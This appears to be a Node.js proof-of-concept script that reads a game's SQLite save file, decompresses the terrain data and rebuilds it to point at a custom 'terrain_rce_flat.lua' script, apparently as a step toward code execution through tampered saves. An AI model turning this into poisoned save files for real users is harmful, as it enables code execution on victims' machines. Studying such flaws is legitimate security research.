const sqlite3 = require("sqlite3");
const { open } = require("sqlite");
const SQL = require("sql-template-strings");
const fs = require("fs");
const LZ4 = require("lz4");


(async () => {

    /**
     * Getting the data out of the save file
     */

    // Open the save file
    const db = await open({
        filename: "./TerrainRCE_FLAT.db",
        mode: sqlite3.OPEN_READWRITE,
        driver: sqlite3.Database
    });

    // Get the data containing the terrain script path and classname
    const { data: dataCompressed } = await db.get(SQL`SELECT data FROM GenericData WHERE channel = 11`);

    console.log("Compressed data read from the save file:", {
        buffer: dataCompressed,
        string: dataCompressed.toString()
    });

    await fs.promises.writeFile("./data_compressed.bin", dataCompressed);



    /**
     * Decompressing the data
     */
    
    // Allocate a buffer to write the decompressed data to
    let uncompressed = Buffer.alloc(128);

    // Skip the header (first 11 bytes)
    let buff = dataCompressed.slice(12);

    // Decompress
    let uncompressedSize = LZ4.decodeBlock(buff, uncompressed)
    
    // Resize the buffer to only include the decompressed data
    let data = uncompressed.slice(0, uncompressedSize)

    console.log("Decompressed data, excluding header:", {
        buffer: data,
        string: data.toString()
    });

    await fs.promises.writeFile("./data.bin", data);



    /**
     * Constructing new data
     */

    // Seed
    let seed = Buffer.from(data.slice(0, 4));

    let filename = "$CONTENT_637efa72-b1cc-4b16-86c3-222ecad21bcd/Scripts/terrain/terrain_rce_flat.lua"
    let classname = "CreativeFlatWorld"

    let uint16_to_uint8array = uint16 => new Uint8Array([uint16 >> 8, uint16]);

    let reconstructed = Buffer.concat([
        Buffer.from(data.slice(0, 4)), // Seed

        uint16_to_uint8array(filename.length),
        Buffer.from(filename),

        uint16_to_uint8array(classname.length),
        Buffer.from(classname),

        new Uint8Array(10) // For somereason ends with ten 0x00 bytes
    ])

    console.log("Reconstructed data, excluding header:", {
        buffer: reconstructed,
        string: reconstructed.toString()
    });



})();